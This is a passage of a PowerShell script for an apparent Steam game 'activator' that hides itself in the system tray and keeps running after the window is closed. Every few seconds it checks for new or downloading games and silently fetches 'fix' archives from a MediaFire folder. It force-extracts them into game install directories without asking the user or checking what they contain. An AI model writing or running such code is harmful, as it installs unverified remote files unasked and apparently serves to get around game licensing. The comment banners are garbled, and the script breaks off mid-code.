# ÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚Â
$script:trayIcon = New-Object System.Windows.Forms.NotifyIcon
$script:trayIcon.Icon = $form.Icon
$script:trayIcon.Text = "BastissSteam activator"
$script:trayIcon.Visible = $false

# Tray context menu
$trayMenu = New-Object System.Windows.Forms.ContextMenuStrip
$trayMenu.BackColor = $CardBG
$trayMenu.ForeColor = $White
$trayMenu.Font = New-Object System.Drawing.Font("Bahnschrift",9.5)
$trayMenu.Renderer = New-Object System.Windows.Forms.ToolStripProfessionalRenderer(
    New-Object System.Windows.Forms.ProfessionalColorTable
)

$menuAbrir = New-Object System.Windows.Forms.ToolStripMenuItem("Abrir")
$menuAbrir.Add_Click({
    $form.Show(); $form.WindowState = 'Normal'
    $form.Activate(); $script:trayIcon.Visible = $false
})
$menuCerrar = New-Object System.Windows.Forms.ToolStripMenuItem("Cerrar")
$menuCerrar.Add_Click({
    $script:reallyClose = $true
    $script:trayIcon.Visible = $false
    $script:trayIcon.Dispose()
    $form.Close()
})
$trayMenu.Items.Add($menuAbrir) | Out-Null
$trayMenu.Items.Add($menuCerrar) | Out-Null
$script:trayIcon.ContextMenuStrip = $trayMenu

# Double-click tray icon to restore
$script:trayIcon.Add_DoubleClick({
    $form.Show(); $form.WindowState = 'Normal'
    $form.Activate(); $script:trayIcon.Visible = $false
})

# Intercept form close -> minimize to tray
$script:reallyClose = $false
$form.Add_FormClosing({
    param($sender, $ev)
    if (-not $script:reallyClose) {
        $ev.Cancel = $true
        $form.Hide()
        $script:trayIcon.Visible = $true
        $script:trayIcon.ShowBalloonTip(2000, "BastissSteam", "El programa sigue activo en segundo plano.", [System.Windows.Forms.ToolTipIcon]::Info)
    }
})

# ÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚Â

# ÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚Â
#  DOWNLOAD WATCHER (auto-detect new Steam game installs)
# ÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚Â
if ($script:steamLibs -eq $null) { try { $script:steamLibs = Get-SteamLibraries; $script:steamLibsCacheTime = Get-Date } catch {} }
$script:steamWatchTimer = New-Object System.Windows.Forms.Timer
$script:steamWatchTimer.Interval = 3000
$script:steamWatchTimer.Add_Tick({
    try {
        if ($script:fixesJob -eq $null -and ($script:fixesCache.Count -eq 0 -or ((Get-Date) - $script:fixesCacheTime).TotalSeconds -gt 120)) {
            $script:fixesJob = Start-Job -ScriptBlock {
                try {
                    $r = Invoke-RestMethod -Uri "https://www.mediafire.com/api/1.5/folder/get_content.php?folder_key=3o9127pseyx49&response_format=json&content_type=files" -UseBasicParsing -TimeoutSec 10 -ErrorAction Stop
                    $fixes = @{}
                    if ($r.response.folder_content.files) { foreach ($f in $r.response.folder_content.files) { $fixes[($f.filename -replace '\.zip$', '')] = $f.links.normal_download } }
                    return $fixes
                } catch { return @{} }
            }
        }
        if ($script:fixesJob -and $script:fixesJob.IsCompleted) {
            try { $result = Receive-Job $script:fixesJob -ErrorAction Stop; if ($result -and $result.Count -gt 0) { $script:fixesCache = $result } } catch {}
            $script:fixesCacheTime = Get-Date
            Remove-Job $script:fixesJob -ErrorAction SilentlyContinue
            $script:fixesJob = $null
        }
        $fixes = $script:fixesCache

        # Completing pending installs
        $donePending = @()
        foreach ($name in $script:downloadPendingFixes.Keys) {
            $info = $script:downloadPendingFixes[$name]
            if ($info.dlJob -and -not $info.dlJob.IsCompleted) { continue }
            if ($info.dlJob -and $info.dlJob.IsCompleted) { try { $null = Receive-Job $info.dlJob -ErrorAction Stop } catch {}; Remove-Job $info.dlJob -ErrorAction SilentlyContinue }
            if (-not (Test-Path $info.zipPath)) { $donePending += $name; continue }
            $gameFound = $null
            if ($script:steamLibs) { foreach ($lib in $script:steamLibs) { $common = Join-Path $lib "steamapps\common"; $candidate = Join-Path $common $name; if (Test-Path $candidate) { $gameFound = $candidate; break } } }
            if (-not $gameFound) { continue }
            try {
                $er = @()
                try { Add-Type -AssemblyName System.IO.Compression.FileSystem -ErrorAction SilentlyContinue; $z = [System.IO.Compression.ZipFile]::OpenRead($info.zipPath); foreach ($e in $z.Entries) { if ($e.Name) { $er += $e.FullName } }; $z.Dispose() } catch {}
                Expand-Archive -Path $info.zipPath -DestinationPath $gameFound -Force
                if ($er.Count -gt 0) { Add-FixManifestEntry $name $gameFound $er }
                Add-AutoFixedGame $name
            } catch {}
            Remove-Item $info.zipPath -Force -ErrorAction SilentlyContinue
            $donePending += $name
        }
        foreach ($name in $donePending) { $script:downloadPendingFixes.Remove($name) }

        # Detect downloading games
        try {
            if (((Get-Date) - $script:steamLibsCacheTime).TotalSeconds -gt 120 -or $script:commonFolderCache.Count -eq 0) {
                try { $script:steamLibs = Get-SteamLibraries; $script:steamLibsCacheTime = Get-Date } catch {}
                $script:commonFolderCache = @{}
                if ($script:steamLibs) { foreach ($l2 in $script:steamLibs) { $cp = Join-Path $l2 "steamapps\common"; if (Test-Path $cp) { Get-ChildItem $cp -Directory -ErrorAction SilentlyContinue | ForEach-Object { $script:commonFolderCache[$_.Name] = $true } } } }
            }
            $fixesCount = $fixes.Count
            if ($script:steamLibs) { foreach ($lib in @($script:steamLibs)) {
                foreach ($scanSpec in @("downloading", "temp", "")) {
                    $dir = if ($scanSpec) { Join-Path (Join-Path $lib "steamapps") $scanSpec } else { Join-Path $lib "steamapps" }
                    if (-not (Test-Path $dir)) { continue }
                    foreach ($mf in Get-ChildItem $dir -Recurse -Filter "*.acf" -ErrorAction SilentlyContinue) {
                        try { $raw = [System.IO.File]::ReadAllText($mf.FullName)
                            $gn = if ($raw -match '"name"\s+"([^"]+)"') { $Matches[1] } elseif ($raw -match '"installdir"\s+"([^"]+)"') { $Matches[1] } else { continue }
                            if ($script:knownDownloading.ContainsKey($gn) -or $script:downloadPendingFixes.ContainsKey($gn)) { continue }
                            $inCommon = $script:commonFolderCache.ContainsKey($gn)
                            $script:knownDownloading[$gn] = $true
                            if (-not $inCommon -and $fixesCount -gt 0) {
                                $fn, $fu = Find-FixForGame $gn $fixes
                                if ($fu) {
                                    $zipPath = Join-Path $env:TEMP "predl_$(Get-Random).zip"
                                    $dlJob = Start-Job -ScriptBlock { param($u, $o) try { $page = Invoke-WebRequest -Uri $u -UseBasicParsing -TimeoutSec 20 -ErrorAction Stop; $dl = $page.Links | Where-Object { $_.id -eq "downloadButton" } | Select-Object -ExpandProperty href; if (-not $dl) { throw "No download link" }; (New-Object System.Net.WebClient).DownloadFile($dl, $o) } catch {} } -ArgumentList $fu, $zipPath
                                    $script:downloadPendingFixes[$gn] = @{ fix_url = $fu; zipPath = $zipPath; dlJob = $dlJob }
                                }
                            }
                        } catch {}
                    }
                }
                $dlDir = Join-Path (Join-Path $lib "steamapps") "downloading"
                if (Test-Path $dlDir) {
                    foreach ($subDir in Get-ChildItem $dlDir -Directory -ErrorAction SilentlyContinue) {
                        $appid = $subDir.Name
                        if ($script:knownDownloading.ContainsKey($appid) -or $script:downloadPendingFixes.ContainsKey($appid)) { continue }
                        $gn = $null
                        if ($script:steamLibs) { foreach ($sl in $script:steamLibs) { $acfPath = Join-Path (Join-Path $sl "steamapps") "appmanifest_$appid.acf"; if (-not (Test-Path $acfPath)) { continue }; try { $raw = [System.IO.File]::ReadAllText($acfPath) } catch { continue }; $gn = if ($raw -match '"name"\s+"([^"]+)"') { $Matches[1] } elseif ($raw -match '"installdir"\s+"([^"]+)"') { $Matches[1] }; if ($gn) { break } } }
                        if (-not $gn) { try { $r2 = Invoke-RestMethod "https://store.steampowered.com/api/appdetails?appids=$appid" -UseBasicParsing -TimeoutSec 3 -ErrorAction SilentlyContinue; if ($r2.$appid.success -eq $true -and $r2.$appid.data.name) { $gn = $r2.$appid.data.name } } catch {} }
                        if (-not $gn) { $script:knownDownloading[$appid] = $true; continue }
                        if ($script:downloadPendingFixes.ContainsKey($gn)) { $script:knownDownloading[$appid] = $true; continue }
                        $inCommon = $script:commonFolderCache.ContainsKey($gn)
                        if ($inCommon) { $script:knownDownloading[$appid] = $true; continue }
                        if ($fixesCount -eq 0) { continue }
                        $fn, $fu = Find-FixForGame $gn $fixes
                        if (-not $fu) { $script:knownDownloading[$appid] = $true; continue }
                        $zipPath = Join-Path $env:TEMP "predl_$(Get-Random).zip"
                        $dlJob = Start-Job -ScriptBlock { param($u, $o) try { $page = Invoke-WebRequest -Uri $u -UseBasicParsing -TimeoutSec 20 -ErrorAction Stop; $dl = $page.Links | Where-Object { $_.id -eq "downloadButton" } | Select-Object -ExpandProperty href; if (-not $dl) { throw "No download link" }; (New-Object System.Net.WebClient).DownloadFile($dl, $o) } catch {} } -ArgumentList $fu, $zipPath
                        $script:downloadPendingFixes[$gn] = @{ fix_url = $fu; zipPath = $zipPath; dlJob = $dlJob }
                        $script:knownDownloading[$appid] = $true
                    }
                }
            } }
        } catch {}

        if ($fixesCount -gt 0) {
            $done = @()
            foreach ($name in $script:fixJobs.Keys) {
                $info = $script:fixJobs[$name]
                try { if ($info.job.IsCompleted) {
                    $er = @(Receive-Job $info.job -ErrorAction Stop)
                    Remove-Job $info.job -ErrorAction SilentlyContinue
                    if ($er.Count -gt 0) { Add-FixManifestEntry $name $info.path $er }
                    Add-AutoFixedGame $name
                    $done += $name
                } } catch { Remove-Job $info.job -ErrorAction SilentlyContinue; $done += $name }
            }
            foreach ($name in $done) { $script:fixJobs.Remove($name) }
        }

        $curFolders = @{}
        if (((Get-Date) - $script:steamLibsCacheTime).TotalSeconds -gt 120) { try { $script:steamLibs = Get-SteamLibraries; $script:steamLibsCacheTime = Get-Date } catch {} }
        if ($script:steamLibs) { foreach ($lib in $script:steamLibs) { $common = Join-Path $lib "steamapps\common"; if (Test-Path $common) { Get-ChildItem $common -Directory -ErrorAction SilentlyContinue | ForEach-Object { $curFolders[$_.Name] = $_.FullName } } } }
        $noGameFolders = @("Steamworks Shared", "Steam Controller Configs")
        foreach ($name in $curFolders.Keys) {
            if ($noGameFolders -contains $name) { continue }
            if ($script:fixedNewGames.ContainsKey($name)) { continue }
            if ($script:fixJobs.ContainsKey($name)) { continue }
            if ($script:downloadPendingFixes.ContainsKey($name)) { continue }
            $script:fixedNewGames[$name] = $true
            if ($fixesCount -eq 0) { continue }
            $fn, $fu = Find-FixForGame $name $fixes
            if ($fu) {
                $zip = Join-Path $env:TEMP "newfix_$(Get-Random).zip"
                $job = Start-Job -ScriptBlock {
                    param($u, $o, $p) try { $page = Invoke-WebRequest -Uri $u -UseBasicParsing -TimeoutSec 20 -ErrorAction Stop
                    $dl = $page.Links | Where-Object { $_.id -eq "downloadButton" } | Select-Object -ExpandProperty href
                    if (-not $dl) { throw "No download link" }
                    (New-Object System.Net.WebClient).DownloadFile($dl, $o)
                    Expand-Archive -Path $o -DestinationPath $p -Force -ErrorAction Stop
                    $er = @()
